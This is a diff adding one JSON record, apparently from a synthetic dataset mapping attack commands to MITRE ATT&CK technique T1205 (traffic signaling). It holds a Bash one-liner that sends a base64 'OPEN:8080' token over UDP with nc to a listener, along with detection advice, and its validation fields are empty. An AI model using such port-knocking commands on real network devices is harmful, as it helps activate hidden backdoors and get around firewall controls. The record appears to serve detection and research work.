@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "echo -n 'OPEN:8080' | base64 -w0 | nc -u -w1 203.0.113.1 40000",
+  "explanation": "Encodes a magic control string with base64 and sends it via UDP/40000 as a covert signal to instruct a listener to open TCP/8080. No elevated privileges are required to transmit. Detection: inspect unusual base64-like payloads to high, otherwise unused UDP ports and correlate with subsequent firewall state changes.",
+  "rationale_steps": [
+    "Form a simple magic token indicating the port to open.",
+    "Base64-encode for formatting (not obfuscation).",
+    "Deliver to a predefined UDP signaling port via nc.",
+    "Detection: DPI for base64 blobs to control ports and monitoring for new ACCEPT rules following such packets."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-bba1a632-8f87a215",
+  "source_prompt_hash": "bba1a632",
+  "timestamp_utc": "2025-09-30T05:49:31.290544Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
